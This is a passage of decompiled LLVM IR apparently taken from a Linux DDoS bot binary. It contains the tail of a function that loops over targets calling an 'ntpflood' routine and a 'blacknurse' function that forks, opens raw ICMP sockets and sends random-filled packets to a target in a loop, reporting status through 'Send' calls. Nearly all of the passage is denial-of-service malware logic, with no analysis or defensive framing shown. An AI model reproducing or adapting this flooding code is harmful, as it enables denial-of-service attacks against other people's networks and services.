  store i1 false, i1* @df, align 1
  store i32 %v0_804b9bc, i32* @edi, align 4
  %v3_804ba8b = call i32 @_strlen(i8* %v4_804bb91)
  %v4_804ba8b = mul i32 %v3_804ba8b, -1
  %v5_804ba8b = add i32 %v4_804ba8b, -2
  store i32 %v5_804ba8b, i32* @ecx, align 4
  %v1_804ba95 = sub i32 %v5_804ba92, %v4_804ba8b
  %v1_804ba96 = inttoptr i32 %v1_804ba95 to i8*
  store i8 0, i8* %v1_804ba96, align 1
  %v0_804ba99 = load i32, i32* @global_var_807f300.80, align 256
  store i32 %v0_804ba99, i32* %eax.global-to-local, align 4
  %v1_804ba9e = icmp eq i32 %v0_804ba99, 0
  %v1_804baa0 = icmp eq i1 %v1_804ba9e, false
  %v2_804bb12 = call i32 @malloc(i32 540)
  store i32 %v2_804bb12, i32* %eax.global-to-local, align 4
  br i1 %v1_804baa0, label %dec_label_pc_804bb0b, label %dec_label_pc_804baa2

dec_label_pc_804baa2:                             ; preds = %dec_label_pc_804ba74
  store i32 %v2_804bb12, i32* @global_var_807f300.80, align 256
  store i32 %v2_804bb12, i32* %eax.global-to-local, align 4
  %v1_804bab8 = inttoptr i32 %v2_804bb12 to i32*
  store i32 0, i32* %v1_804bab8, align 4
  %v0_804babe = load i32, i32* %eax.global-to-local, align 4
  %v1_804babe = add i32 %v0_804babe, 4
  %v2_804babe = inttoptr i32 %v1_804babe to i32*
  store i32 0, i32* %v2_804babe, align 4
  %v0_804bac5 = load i32, i32* %eax.global-to-local, align 4
  %v1_804bac5 = add i32 %v0_804bac5, 8
  %v2_804bac5 = inttoptr i32 %v1_804bac5 to i32*
  store i32 0, i32* %v2_804bac5, align 4
  %v0_804bacc = load i32, i32* %eax.global-to-local, align 4
  %v1_804bacc = add i32 %v0_804bacc, 12
  %v2_804bacc = inttoptr i32 %v1_804bacc to i32*
  store i32 0, i32* %v2_804bacc, align 4
  %v0_804bad3 = load i32, i32* @global_var_807f300.80, align 256
  store i32 %v0_804bad3, i32* @ebx, align 4
  store i32 %v0_804b9bc, i32* %eax.global-to-local, align 4
  %v2_804badf = call i32 @inet_addr(i32 %v0_804b9bc)
  %v1_804bae4 = load i32, i32* @ebx, align 4
  %v2_804bae4 = add i32 %v1_804bae4, 4
  %v3_804bae4 = inttoptr i32 %v2_804bae4 to i32*
  store i32 %v2_804badf, i32* %v3_804bae4, align 4
  %v0_804bae7 = load i32, i32* @global_var_807f300.80, align 256
  %v2_804baf2 = add i32 %v0_804bae7, 532
  %v3_804baf2 = inttoptr i32 %v2_804baf2 to i32*
  store i32 %v0_804bae7, i32* %v3_804baf2, align 4
  %v0_804baf8 = load i32, i32* @global_var_807f300.80, align 256
  store i32 %v0_804baf8, i32* @edx, align 4
  store i32 %v0_804baf8, i32* %eax.global-to-local, align 4
  %v2_804bb03 = add i32 %v0_804baf8, 536
  %v3_804bb03 = inttoptr i32 %v2_804bb03 to i32*
  store i32 %v0_804baf8, i32* %v3_804bb03, align 4
  br label %dec_label_pc_804bb7d

dec_label_pc_804bb0b:                             ; preds = %dec_label_pc_804ba74
  store i32 %v2_804bb12, i32* @edx, align 4
  store i32 540, i32* %eax.global-to-local, align 4
  %v4_804bb30 = inttoptr i32 %v2_804bb12 to i8*
  %v6_804bb33 = call i32 @__GI_memset(i8* %v4_804bb30, i32 0, i32 540)
  store i32 %v0_804b9bc, i32* %eax.global-to-local, align 4
  %v2_804bb3e = call i32 @inet_addr(i32 %v0_804b9bc)
  %v2_804bb48 = add i32 %v2_804bb12, 4
  %v3_804bb48 = inttoptr i32 %v2_804bb48 to i32*
  store i32 %v2_804bb3e, i32* %v3_804bb48, align 4
  %v0_804bb4b = load i32, i32* @global_var_807f300.80, align 256
  store i32 %v0_804bb4b, i32* %edx.global-to-local, align 4
  %v2_804bb54 = add i32 %v2_804bb12, 536
  %v3_804bb54 = inttoptr i32 %v2_804bb54 to i32*
  store i32 %v0_804bb4b, i32* %v3_804bb54, align 4
  %v0_804bb5a = load i32, i32* @global_var_807f300.80, align 256
  store i32 %v0_804bb5a, i32* %eax.global-to-local, align 4
  %v1_804bb5f = add i32 %v0_804bb5a, 532
  %v2_804bb5f = inttoptr i32 %v1_804bb5f to i32*
  %v3_804bb5f = load i32, i32* %v2_804bb5f, align 4
  %v2_804bb68 = add i32 %v2_804bb12, 532
  %v3_804bb68 = inttoptr i32 %v2_804bb68 to i32*
  store i32 %v3_804bb5f, i32* %v3_804bb68, align 4
  %v0_804bb6e = load i32, i32* @global_var_807f300.80, align 256
  store i32 %v0_804bb6e, i32* @edx, align 4
  store i32 %v2_804bb12, i32* %eax.global-to-local, align 4
  %v2_804bb77 = add i32 %v0_804bb6e, 532
  %v3_804bb77 = inttoptr i32 %v2_804bb77 to i32*
  store i32 %v2_804bb12, i32* %v3_804bb77, align 4
  br label %dec_label_pc_804bb7d

dec_label_pc_804bb7d:                             ; preds = %dec_label_pc_804baa2, %dec_label_pc_804bb0b
  br label %dec_label_pc_804bb80.outer

dec_label_pc_804bb80.outer:                       ; preds = %dec_label_pc_804bb7d, %dec_label_pc_804b90c
  br label %dec_label_pc_804bb80

dec_label_pc_804bb80:                             ; preds = %dec_label_pc_804bb80.outer, %dec_label_pc_804ba47
  store i32 %v0_804b9bc, i32* %eax.global-to-local, align 4
  %v5_804bb94 = call i32 @fgets(i32 %v0_804b9bc, i32 128, i32 %v3_804ba11)
  store i32 %v5_804bb94, i32* %eax.global-to-local, align 4
  %v1_804bb99 = icmp eq i32 %v5_804bb94, 0
  %v1_804bb9b = icmp eq i1 %v1_804bb99, false
  br i1 %v1_804bb9b, label %dec_label_pc_804ba1e, label %dec_label_pc_804bba1

dec_label_pc_804bba1:                             ; preds = %dec_label_pc_804bb80
  %v0_804bba1 = load i32, i32* @global_var_807f300.80, align 256
  store i32 %v0_804bba1, i32* %eax.global-to-local, align 4
  %v1_804bba6 = add i32 %v0_804bba1, 532
  %v2_804bba6 = inttoptr i32 %v1_804bba6 to i32*
  %v3_804bba6 = load i32, i32* %v2_804bba6, align 4
  %v1_804bbbb = add i32 %arg4, 4
  store i32 %v1_804bbbb, i32* %eax.global-to-local, align 4
  %v1_804bbbe = inttoptr i32 %v1_804bbbb to i32*
  %v2_804bbbe = load i32, i32* %v1_804bbbe, align 4
  store i32 %v2_804bbbe, i32* %eax.global-to-local, align 4
  %v2_804bbc3 = call i32 @inet_addr(i32 %v2_804bbbe)
  %v1_804bbd1 = mul i32 %v2_804b9cc, 4
  store i32 %v1_804bbd1, i32* %edx.global-to-local, align 4
  %v2_804bbdf = mul i32 %v2_804b9cc, 28
  %v1_804bbe4 = add i32 %v2_804bbdf, 30
  %v2_804bbe7 = and i32 %v1_804bbe4, -16
  %v0_804bbed = load i32, i32* @esp, align 4
  %v2_804bbed = sub i32 %v0_804bbed, %v2_804bbe7
  %v1_804bbff = add i32 %v2_804bbed, 47
  %v2_804bc02 = and i32 %v1_804bbff, -16
  store i32 %v2_804bc02, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804bcc355 = icmp sgt i32 %v2_804b9cc, 0
  br i1 %v5_804bcc355, label %dec_label_pc_804bc23.lr.ph, label %dec_label_pc_804bcc9

dec_label_pc_804bc23.lr.ph:                       ; preds = %dec_label_pc_804bba1
  %v3_804bc57 = or i32 %v2_804bc02, 8
  br label %dec_label_pc_804bc23

dec_label_pc_804bc23:                             ; preds = %dec_label_pc_804bc23, %dec_label_pc_804bc23.lr.ph
  %storemerge456 = phi i32 [ 0, %dec_label_pc_804bc23.lr.ph ], [ %v4_804bcba, %dec_label_pc_804bc23 ]
  %v1_804bc29 = mul i32 %storemerge456, 4
  %v2_804bc37 = mul i32 %storemerge456, 28
  %v3_804bc3c = add i32 %v2_804bc37, %v2_804bc02
  %v4_804bc3c = inttoptr i32 %v3_804bc3c to i32*
  store i32 %storemerge456, i32* %v4_804bc3c, align 4
  store i32 %v2_804bc02, i32* %ecx.global-to-local, align 4
  store i32 %v2_804bc37, i32* %edx.global-to-local, align 4
  %v4_804bc57 = add i32 %v3_804bc57, %v2_804bc37
  %v5_804bc57 = inttoptr i32 %v4_804bc57 to i32*
  store i32 2, i32* %v5_804bc57, align 4
  %v1_804bc61 = load i32, i32* %edx.global-to-local, align 4
  %v2_804bc61 = load i32, i32* %ecx.global-to-local, align 4
  %v3_804bc61 = add i32 %v1_804bc61, 12
  %v4_804bc61 = add i32 %v3_804bc61, %v2_804bc61
  %v5_804bc61 = inttoptr i32 %v4_804bc61 to i32*
  store i32 %v2_804bbc3, i32* %v5_804bc61, align 4
  %v1_804bc6b = load i32, i32* %edx.global-to-local, align 4
  %v2_804bc6b = load i32, i32* %ecx.global-to-local, align 4
  %v3_804bc6b = add i32 %v1_804bc6b, 16
  %v4_804bc6b = add i32 %v3_804bc6b, %v2_804bc6b
  %v5_804bc6b = inttoptr i32 %v4_804bc6b to i32*
  %v1_804bc75 = load i32, i32* %edx.global-to-local, align 4
  %v2_804bc75 = load i32, i32* %ecx.global-to-local, align 4
  %v3_804bc75 = add i32 %v1_804bc75, 20
  %v4_804bc75 = add i32 %v3_804bc75, %v2_804bc75
  %v5_804bc75 = inttoptr i32 %v4_804bc75 to i32*
  %v1_804bc91 = add i32 %v3_804bc3c, 4
  %v2_804bc97 = inttoptr i32 %v1_804bc91 to i32*
  store i32 %v3_804bba6, i32* %v2_804bc97, align 4
  store i32 %v2_804bc02, i32* %ecx.global-to-local, align 4
  store i32 %v1_804bc29, i32* %edx.global-to-local, align 4
  store i32 %v3_804bc3c, i32* %eax.global-to-local, align 4
  %v1_804bcb2 = load i32, i32* @esp, align 4
  %v2_804bcb2 = inttoptr i32 %v1_804bcb2 to i32*
  store i32 %v3_804bc3c, i32* %v2_804bcb2, align 4
  %v0_804bcb5 = call i32 @ntpflood()
  %v4_804bcba = add nuw nsw i32 %storemerge456, 1
  store i32 %v4_804bcba, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_804bcba, %v2_804b9cc
  br i1 %exitcond, label %dec_label_pc_804bcbd.dec_label_pc_804bcc9_crit_edge, label %dec_label_pc_804bc23

dec_label_pc_804bcbd.dec_label_pc_804bcc9_crit_edge: ; preds = %dec_label_pc_804bc23
  %v1_804bcd9.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804bcc9

dec_label_pc_804bcc9:                             ; preds = %dec_label_pc_804bcbd.dec_label_pc_804bcc9_crit_edge, %dec_label_pc_804bba1
  %v1_804bcd9 = phi i32 [ %v1_804bcd9.pre, %dec_label_pc_804bcbd.dec_label_pc_804bcc9_crit_edge ], [ %v2_804bbed, %dec_label_pc_804bba1 ]
  %storemerge4.lcssa = phi i32 [ %v2_804b9cc, %dec_label_pc_804bcbd.dec_label_pc_804bcc9_crit_edge ], [ 0, %dec_label_pc_804bba1 ]
  %v1_804bccc = add i32 %arg4, 8
  store i32 %v1_804bccc, i32* %eax.global-to-local, align 4
  %v1_804bccf = inttoptr i32 %v1_804bccc to i32*
  %v2_804bccf = load i32, i32* %v1_804bccf, align 4
  store i32 %v2_804bccf, i32* %edx.global-to-local, align 4
  store i32 %v1_804bbbb, i32* %eax.global-to-local, align 4
  %v2_804bcd7 = load i32, i32* %v1_804bbbe, align 4
  store i32 %v2_804bcd7, i32* %eax.global-to-local, align 4
  %v2_804bcd9 = add i32 %v1_804bcd9, 16
  %v3_804bcd9 = inttoptr i32 %v2_804bcd9 to i32*
  store i32 %v2_804bccf, i32* %v3_804bcd9, align 4
  %v0_804bcdd = load i32, i32* %eax.global-to-local, align 4
  %v1_804bcdd = load i32, i32* @esp, align 4
  %v2_804bcdd = add i32 %v1_804bcdd, 12
  %v3_804bcdd = inttoptr i32 %v2_804bcdd to i32*
  store i32 %v0_804bcdd, i32* %v3_804bcdd, align 4
  %v1_804bce4 = load i32, i32* @esp, align 4
  %v2_804bce4 = add i32 %v1_804bce4, 8
  %v3_804bce4 = inttoptr i32 %v2_804bce4 to i32*
  store i32 %arg2, i32* %v3_804bce4, align 4
  %v0_804bce8 = load i32, i32* @esp, align 4
  %v1_804bce8 = add i32 %v0_804bce8, 4
  %v2_804bce8 = inttoptr i32 %v1_804bce8 to i32*
  store i32 ptrtoint ([36 x i8]* @global_var_806a0f0.105 to i32), i32* %v2_804bce8, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v1_804bcf3 = load i32, i32* @esp, align 4
  %v2_804bcf3 = inttoptr i32 %v1_804bcf3 to i32*
  store i32 %arg1, i32* %v2_804bcf3, align 4
  %v2_804bcf6 = call i32 @Send(i32 %storemerge4.lcssa, i32 128)
  store i32 %v2_804bcf6, i32* %eax.global-to-local, align 4
  %v1_804bd94 = add i32 %arg4, 24
  %v1_804bd97 = inttoptr i32 %v1_804bd94 to i32*
  br label %dec_label_pc_804bd91

dec_label_pc_804bd07:                             ; preds = %dec_label_pc_804bd91
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 50000, i32* %eax.global-to-local, align 4
  %v1_804bd16 = load i32, i32* @esp, align 4
  %v2_804bd16 = inttoptr i32 %v1_804bd16 to i32*
  store i32 50000, i32* %v2_804bd16, align 4
  %v1_804bd19 = sext i32 %storemerge to i64
  %v2_804bd19 = call i32 @usleep(i64 %v1_804bd19)
  %v0_804bd1e = load i64, i64* @global_var_807e2e0.88, align 8
  %sext = mul i64 %v0_804bd1e, 4294967296
  %v2_804bd27 = sdiv i64 %sext, 4294967296
  %v4_804bd27 = mul nsw i64 %v2_804bd27, 20
  %v5_804bd27 = trunc i64 %v4_804bd27 to i32
  store i32 %v5_804bd27, i32* %edx.global-to-local, align 4
  %tmp = icmp ugt i32 %v5_804bd27, %v2_804b9df
  %v0_804bd56 = load i32, i32* @global_var_807e1a8.89, align 8
  store i32 %v0_804bd56, i32* %eax.global-to-local, align 4
  br i1 %tmp, label %dec_label_pc_804bd31, label %dec_label_pc_804bd56

dec_label_pc_804bd31:                             ; preds = %dec_label_pc_804bd07
  %tmp47 = icmp slt i32 %v0_804bd56, 1
  %tmp48 = icmp eq i1 %tmp47, false
  br i1 %tmp48, label %dec_label_pc_804bd49, label %dec_label_pc_804bd3a

dec_label_pc_804bd3a:                             ; preds = %dec_label_pc_804bd31
  %v0_804bd3a = load i32, i32* @global_var_8070d88.90, align 8
  %v1_804bd3f = add i32 %v0_804bd3a, 100
  store i32 %v1_804bd3f, i32* %eax.global-to-local, align 4
  store i32 %v1_804bd3f, i32* @global_var_8070d88.90, align 8
  br label %dec_label_pc_804bd84

dec_label_pc_804bd49:                             ; preds = %dec_label_pc_804bd31
  %v1_804bd4e = add i32 %v0_804bd56, -1
  store i32 %v1_804bd4e, i32* %eax.global-to-local, align 4
  store i32 %v1_804bd4e, i32* @global_var_807e1a8.89, align 8
  br label %dec_label_pc_804bd84

dec_label_pc_804bd56:                             ; preds = %dec_label_pc_804bd07
  %v1_804bd5b = add i32 %v0_804bd56, 1
  store i32 %v1_804bd5b, i32* @global_var_807e1a8.89, align 8
  %v0_804bd61 = load i32, i32* @global_var_8070d88.90, align 8
  store i32 %v0_804bd61, i32* %eax.global-to-local, align 4
  %v1_804bd66 = add i32 %v0_804bd61, -25
  %v5_804bd66 = icmp ult i32 %v0_804bd61, 25
  %v9_804bd66 = icmp eq i32 %v1_804bd66, 0
  %v2_804bd69 = or i1 %v5_804bd66, %v9_804bd66
  br i1 %v2_804bd69, label %dec_label_pc_804bd7a, label %dec_label_pc_804bd6b

dec_label_pc_804bd6b:                             ; preds = %dec_label_pc_804bd56
  store i32 %v1_804bd66, i32* %eax.global-to-local, align 4
  store i32 %v1_804bd66, i32* @global_var_8070d88.90, align 8
  br label %dec_label_pc_804bd84

dec_label_pc_804bd7a:                             ; preds = %dec_label_pc_804bd56
  store i32 0, i32* @global_var_8070d88.90, align 8
  br label %dec_label_pc_804bd84

dec_label_pc_804bd84:                             ; preds = %dec_label_pc_804bd6b, %dec_label_pc_804bd49, %dec_label_pc_804bd3a, %dec_label_pc_804bd7a
  store i64 0, i64* @global_var_807e2e0.88, align 32
  %v4_804bd8e = add i32 %storemerge, 1
  br label %dec_label_pc_804bd91

dec_label_pc_804bd91:                             ; preds = %dec_label_pc_804bcc9, %dec_label_pc_804bd84
  %storemerge = phi i32 [ %v4_804bd8e, %dec_label_pc_804bd84 ], [ 0, %dec_label_pc_804bcc9 ]
  store i32 %v1_804bd94, i32* %eax.global-to-local, align 4
  %v2_804bd97 = load i32, i32* %v1_804bd97, align 4
  store i32 %v2_804bd97, i32* %eax.global-to-local, align 4
  %v1_804bd99 = load i32, i32* @esp, align 4
  %v2_804bd99 = inttoptr i32 %v1_804bd99 to i32*
  store i32 %v2_804bd97, i32* %v2_804bd99, align 4
  %v1_804bd9c = call i32 @atol(i32 %storemerge)
  %v9_804bda1 = mul i32 %v1_804bd9c, 20
  store i32 %v9_804bda1, i32* %eax.global-to-local, align 4
  %v8_804bda8 = icmp sgt i32 %v9_804bda1, %storemerge
  br i1 %v8_804bda8, label %dec_label_pc_804bd07, label %dec_label_pc_804bdae

dec_label_pc_804bdae:                             ; preds = %dec_label_pc_804bd91
  %v0_804bdae = load i32, i32* @esp, align 4
  %v1_804bdae = inttoptr i32 %v0_804bdae to i32*
  store i32 0, i32* %v1_804bdae, align 4
  %v1_804bdb5 = call i32 @__GI_exit(i32 %storemerge)
  store i32 %v1_804bdb5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bdba

dec_label_pc_804bdba:                             ; preds = %dec_label_pc_804b8cb, %entry, %dec_label_pc_804bdae
  %v0_804bdc7 = phi i32 [ %v1_804b8f7, %dec_label_pc_804b8cb ], [ %v2_804b861, %entry ], [ %v1_804bdb5, %dec_label_pc_804bdae ]
  ret i32 %v0_804bdc7

; uselistorder directives
  uselistorder i32 %v9_804bda1, { 1, 0 }
  uselistorder i32 %storemerge, { 0, 3, 4, 2, 1 }
  uselistorder i32 %v1_804bd66, { 1, 0, 2 }
  uselistorder i32 %v0_804bd56, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804bd94, { 1, 0 }
  uselistorder i32 %v3_804bc3c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804bc37, { 0, 2, 1 }
  uselistorder i32 %storemerge456, { 3, 2, 0, 1 }
  uselistorder i32 %v2_804bc02, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v0_804baf8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804bae7, { 1, 0 }
  uselistorder i32 %v2_804bb12, { 1, 0, 2, 3, 4, 8, 9, 7, 6, 5, 10 }
  uselistorder i32 %v2_804b9cc, { 1, 0, 2, 4, 3 }
  uselistorder i32 %v0_804b9bc, { 12, 10, 7, 6, 5, 4, 8, 1, 3, 2, 0, 9, 11 }
  uselistorder i32 %v4_804b8ff, { 1, 0 }
  uselistorder i32 %v4_804b89f, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 17, 6, 7, 8, 0, 1, 3, 4, 2, 5, 13, 9, 10, 11, 12, 14, 16, 15, 68, 18, 19, 20, 23, 41, 21, 22, 24, 25, 26, 28, 29, 30, 31, 32, 27, 33, 34, 35, 36, 37, 38, 39, 40, 42, 43, 44, 45, 46, 47, 48, 49, 51, 50, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 63, 62, 64, 65, 67, 66 }
  uselistorder i32 %arg4, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804bdba, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804bd91, { 1, 0 }
  uselistorder label %dec_label_pc_804bd84, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804bb7d, { 1, 0 }
  uselistorder label %dec_label_pc_804b8cb, { 1, 0 }
  uselistorder label %dec_label_pc_804b89f, { 1, 0 }
}

define i32 @blacknurse(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-172 = alloca i8*, align 4
  %v2_804bdd4 = ptrtoint i32* %stack_var_-92 to i32
  %tmp36 = bitcast i32* %stack_var_-92 to i8*
  store i32 %v2_804bdd4, i32* @edi, align 4
  store i32 ptrtoint (i8** @global_var_806a120.106 to i32), i32* @esi, align 4
  store i1 false, i1* @df, align 1
  %v7_804bde4 = call i8* @_memcpy(i8* %tmp36, i8* bitcast (i8** @global_var_806a120.106 to i8*), i32 9)
  store i8* null, i8** %stack_var_-172, align 4
  %v3_804bdf4 = call i32 @__GI_time(i32* null)
  %v4_804bdff = inttoptr i32 %arg2 to i8*
  store i8* %v4_804bdff, i8** %stack_var_-172, align 4
  %v2_804be02 = call i32 @mfork(i32 %arg2)
  %v1_804be07 = icmp eq i32 %v2_804be02, 0
  %v1_804be09 = icmp eq i1 %v1_804be07, false
  br i1 %v1_804be09, label %dec_label_pc_804c03b, label %dec_label_pc_804be0f

dec_label_pc_804be0f:                             ; preds = %entry
  store i8* inttoptr (i32 2 to i8*), i8** %stack_var_-172, align 4
  %v5_804be26 = call i32 @socket(i32 2, i32 3, i32 255)
  %v5_804be2e = icmp slt i32 %v5_804be26, 0
  %v1_804be32 = icmp eq i1 %v5_804be2e, false
  br i1 %v1_804be32, label %dec_label_pc_804be40, label %dec_label_pc_804be34

dec_label_pc_804be34:                             ; preds = %dec_label_pc_804be0f
  store i8* inttoptr (i32 1 to i8*), i8** %stack_var_-172, align 4
  %v2_804be3b = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_804be40

dec_label_pc_804be40:                             ; preds = %dec_label_pc_804be0f, %dec_label_pc_804be34
  %v4_804be40 = add i32 %arg3, -1
  %v9_804be40 = sub i32 0, %arg3
  %v10_804be40 = and i32 %arg3, %v9_804be40
  %v11_804be40 = icmp slt i32 %v10_804be40, 0
  %v12_804be40 = icmp eq i32 %v4_804be40, 0
  %v13_804be40 = icmp slt i32 %v4_804be40, 0
  %v3_804be44 = icmp eq i1 %v13_804be40, %v11_804be40
  %v4_804be44 = icmp eq i1 %v12_804be40, false
  %v5_804be44 = and i1 %v4_804be44, %v3_804be44
  br i1 %v5_804be44, label %dec_label_pc_804be6c, label %dec_label_pc_804be46

dec_label_pc_804be46:                             ; preds = %dec_label_pc_804be40
  %v4_804be58 = inttoptr i32 %arg1 to i8*
  store i8* %v4_804be58, i8** %stack_var_-172, align 4
  %v4_804be5b = call i32 @Send(i32 %arg1, i32 ptrtoint ([41 x i8]* @global_var_806a144.107 to i32))
  store i8* inttoptr (i32 1 to i8*), i8** %stack_var_-172, align 4
  %v2_804be67 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_804be6c

dec_label_pc_804be6c:                             ; preds = %dec_label_pc_804be40, %dec_label_pc_804be46
  %v1_804be6f = add i32 %arg4, 4
  %v1_804be72 = inttoptr i32 %v1_804be6f to i32*
  %v2_804be72 = load i32, i32* %v1_804be72, align 4
  %v1_804be7a = add i32 %arg4, 8
  %v1_804be7d = inttoptr i32 %v1_804be7a to i32*
  %v2_804be7d = load i32, i32* %v1_804be7d, align 4
  %v4_804be7f = inttoptr i32 %v2_804be7d to i8*
  store i8* %v4_804be7f, i8** %stack_var_-172, align 4
  %v2_804be82 = call i32 @atol(i32 %v2_804be7d)
  %v2_804be8a = ptrtoint i32* %stack_var_-128 to i32
  %tmp37 = bitcast i32* %stack_var_-128 to i8*
  store i32 %v2_804be8a, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_804be9e = call i8* @_memset(i8* %tmp37, i32 0, i32 8)
  %v6_804be9e = ptrtoint i8* %v5_804be9e to i32
  store i32 %v6_804be9e, i32* @ecx, align 4
  %v2_804bea7 = ptrtoint i32* %stack_var_-96 to i32
  %v4_804bec0 = inttoptr i32 %v2_804be72 to i8*
  store i8* %v4_804bec0, i8** %stack_var_-172, align 4
  %v7_804bec3 = call i32 @getaddrinfo(i8* %v4_804bec0, i32 0, i32 %v2_804be8a, i32 %v2_804bea7)
  %v4_804becb = icmp eq i32 %v7_804bec3, 0
  br i1 %v4_804becb, label %dec_label_pc_804bedd, label %dec_label_pc_804bed1

dec_label_pc_804bed1:                             ; preds = %dec_label_pc_804be6c
  store i8* inttoptr (i32 1 to i8*), i8** %stack_var_-172, align 4
  %v2_804bed8 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_804bedd

dec_label_pc_804bedd:                             ; preds = %dec_label_pc_804be6c, %dec_label_pc_804bed1
  store i8* inttoptr (i32 2 to i8*), i8** %stack_var_-172, align 4
  %v5_804bef4 = call i32 @socket(i32 2, i32 3, i32 1)
  %v13_804befc = icmp eq i32 %v5_804bef4, -1
  %v1_804bf00 = icmp eq i1 %v13_804befc, false
  br i1 %v1_804bf00, label %dec_label_pc_804bf1a, label %dec_label_pc_804bf02

dec_label_pc_804bf02:                             ; preds = %dec_label_pc_804bedd
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_806a16d.108, i32 0, i32 0), i8** %stack_var_-172, align 4
  %v3_804bf09 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_806a16d.108, i32 0, i32 0))
  store i8* inttoptr (i32 1 to i8*), i8** %stack_var_-172, align 4
  %v2_804bf15 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_804bf1a

dec_label_pc_804bf1a:                             ; preds = %dec_label_pc_804bedd, %dec_label_pc_804bf02
  %v4_804bf33 = inttoptr i32 %arg1 to i8*
  store i8* %v4_804bf33, i8** %stack_var_-172, align 4
  %v4_804bf36 = call i32 @Send(i32 %arg1, i32 ptrtoint ([28 x i8]* @global_var_806a174.109 to i32))
  store i32 %v5_804bef4, i32* %stack_var_-136, align 4
  %v4_804bfa0 = inttoptr i32 %v5_804bef4 to i8*
  %tmp38 = bitcast i32* %stack_var_-136 to i8*
  %tmp39 = bitcast i32* %stack_var_-136 to %pollfd*
  %v5_804c019 = add i32 %v2_804be82, %v3_804bdf4
  br label %dec_label_pc_804bf52.outer

dec_label_pc_804bf52.outer:                       ; preds = %dec_label_pc_804c033, %dec_label_pc_804bf1a
  %stack_var_-32.0.ph = phi i32 [ %v4_804c033, %dec_label_pc_804c033 ], [ %tmp, %dec_label_pc_804bf1a ]
  br label %dec_label_pc_804bf52

dec_label_pc_804bf52:                             ; preds = %dec_label_pc_804bf52.outer, %dec_label_pc_804bfbd
  br label %dec_label_pc_804bf5b

dec_label_pc_804bf5b:                             ; preds = %dec_label_pc_804bf52, %dec_label_pc_804bf5b
  %v4_804bf6d41 = phi i32 [ 20, %dec_label_pc_804bf52 ], [ %v5_804bf6a, %dec_label_pc_804bf5b ]
  %v5_804bf60 = add i32 %v4_804bf6d41, %v2_804bdd4
  store i32 %v5_804bf60, i32* @ebx, align 4
  %v0_804bf63 = call i32 @random()
  %v1_804bf63 = trunc i32 %v0_804bf63 to i8
  %v3_804bf68 = load i32, i32* @ebx, align 4
  %v4_804bf68 = inttoptr i32 %v3_804bf68 to i8*
  store i8 %v1_804bf63, i8* %v4_804bf68, align 1
  %v5_804bf6a = add i32 %v4_804bf6d41, 1
  %v22_804bf6a = inttoptr i32 %v5_804bf6a to i8*
  %v9_804bf6d = icmp ult i8* %v22_804bf6a, inttoptr (i32 31 to i8*)
  %v13_804bf6d = icmp eq i32 %v4_804bf6d41, 30
  %v2_804bf71 = or i1 %v9_804bf6d, %v13_804bf6d
  br i1 %v2_804bf71, label %dec_label_pc_804bf5b, label %dec_label_pc_804bf73

dec_label_pc_804bf73:                             ; preds = %dec_label_pc_804bf5b
  %v3_804bf73 = load i32, i32* %stack_var_-96, align 4
  %v1_804bf76 = add i32 %v3_804bf73, 16
  %v2_804bf76 = inttoptr i32 %v1_804bf76 to i32*
  %v3_804bf76 = load i32, i32* %v2_804bf76, align 4
  %v1_804bf7c = add i32 %v3_804bf73, 20
  %v2_804bf7c = inttoptr i32 %v1_804bf7c to i32*
  %v3_804bf7c = load i32, i32* %v2_804bf7c, align 4
  store i8* %v4_804bfa0, i8** %stack_var_-172, align 4
  %v8_804bfa3 = call i32 @sendto(i32 %v5_804bef4, i32 %v2_804bdd4, i32 36, i32 0, i32 %v3_804bf7c, i32 %v3_804bf76)
  %v12_804bfad = icmp eq i32 %v8_804bfa3, 36
  br i1 %v12_804bfad, label %dec_label_pc_804c004, label %dec_label_pc_804bfb1

dec_label_pc_804bfb1:                             ; preds = %dec_label_pc_804bf73
  %v0_804bfb1 = load i8*, i8** %stack_var_-172, align 4
  %v1_804bfb1 = ptrtoint i8* %v0_804bfb1 to i32
  %v2_804bfb1 = call i32 @__errno_location(i32 %v1_804bfb1)
  %v1_804bfb6 = inttoptr i32 %v2_804bfb1 to i32*
  %v2_804bfb6 = load i32, i32* %v1_804bfb6, align 4
  %v9_804bfb8 = icmp eq i32 %v2_804bfb6, 105
  %v1_804bfbb = icmp eq i1 %v9_804bfb8, false
  br i1 %v1_804bfbb, label %dec_label_pc_804bfe0, label %dec_label_pc_804bfbd

dec_label_pc_804bfbd:                             ; preds = %dec_label_pc_804bfb1
  store i8* %tmp38, i8** %stack_var_-172, align 4
  %v6_804bfd6 = call i32 @__libc_poll(%pollfd* %tmp39, i32 1, i32 1000)
  br label %dec_label_pc_804bf52

dec_label_pc_804bfe0:                             ; preds = %dec_label_pc_804bfb1
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_806a190.110, i32 0, i32 0), i8** %stack_var_-172, align 4
